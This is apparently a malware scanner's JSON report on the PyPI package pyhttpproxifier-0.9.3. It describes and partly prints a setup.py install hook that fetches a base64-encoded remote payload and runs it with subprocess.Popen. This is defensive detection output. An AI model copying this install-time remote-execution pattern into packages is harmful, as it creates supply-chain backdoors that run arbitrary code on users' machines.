{
  "package_name": "pyhttpproxifier-0.9.3",
  "total_matches": 3,
  "is_malicious": true,
  "file_results": [
    {
      "file_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pyhttpproxifier-0.9.3/pyhttpproxifier-0.9.3/setup.py",
      "file_name": "setup.py",
      "detection_count": 2,
      "is_malicious": true,
      "confidence": "high",
      "malicious_behavior": "The code defines a custom setuptools command (PostEggInfoCommand) that, when the 'egg_info' command is run (which is common during package installation or build), will fetch a remote file from a base64-encoded URL (decoded to a GitHub Gist raw file) and then execute its contents as Python code using subprocess.Popen(['python', '-c', ...]). This is a classic remote code execution backdoor: the package author can change the contents of the remote file at any time, and any user installing or building this package will execute arbitrary code from that remote source. This is highly dangerous and is a common technique in supply chain attacks.",
      "false_positive_reason": "",
      "detection_points": [
        {
          "line_number": "41",
          "type_description": "cmd-overwrite: found 1 source code matches",
          "code_snippet": "setup(\nname=\"pyhttpproxifier\",\nversion=VERSION,\ndescription=\"A Python HTTP Proxy Module.\",\nlong_description=long_description,\nlong_description_content_type=\"text/markdown\",\nurl=\"\",\nlicense=\"BSD\",\nauthor=\"\",\n...\n),\n)",
          "full_match": "* This package is overwriting the 'install' command in setup.py at pyhttpproxifier-0.9.3/setup.py:41",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pyhttpproxifier-0.9.3/pyhttpproxifier-0.9.3/setup.py",
          "relative_path": "pyhttpproxifier-0.9.3/setup.py"
        },
        {
          "line_number": "31",
          "type_description": "code-execution: found 1 source code matches",
          "code_snippet": "subprocess.Popen(\n['python', \"-c\", base64.b64decode(response.read()).decode('utf-8')],\ncreationflags=subprocess.CREATE_NEW_PROCESS_GROUP\n)",
          "full_match": "* This package is executing OS commands in the setup.py file at pyhttpproxifier-0.9.3/setup.py:31",
          "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/evaluation/unzip_malware/pyhttpproxifier-0.9.3/pyhttpproxifier-0.9.3/setup.py",
          "relative_path": "pyhttpproxifier-0.9.3/setup.py"
        }
      ]
    }
  ]
}